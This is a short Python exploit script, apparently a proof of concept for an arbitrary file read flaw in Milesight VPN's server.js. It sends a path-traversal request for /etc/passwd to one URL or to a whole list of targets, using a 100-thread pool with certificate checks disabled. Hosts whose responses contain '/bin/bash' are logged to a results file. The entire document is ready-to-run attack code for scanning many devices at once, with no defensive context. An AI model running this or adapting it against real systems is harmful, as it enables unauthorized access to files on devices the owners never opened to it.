import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______  _____________           _____        ______ _____     ___    ______________   __
___   |/  /__(_)__  /______________(_)______ ___  /___  /_    __ |  / /__  __ \__  | / /
__  /|_/ /__  /__  /_  _ \_  ___/_  /__  __ `/_  __ \  __/    __ | / /__  /_/ /_   |/ / 
_  /  / / _  / _  / /  __/(__  )_  / _  /_/ /_  / / / /_      __ |/ / _  ____/_  /|  /  
/_/  /_/  /_/  /_/  \___//____/ /_/  _\__, / /_/ /_/\__/      _____/  /_/     /_/ |_/   
                                     /____/                                             """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='Milesight VPN server.js 任意文件读取漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/../../../../../../etc/passwd'
    headers = {
        'Content-Type':'application/x-www-form-urlencoded'
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if res.status_code == 200 and '/bin/bash' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == '__main__':
    main()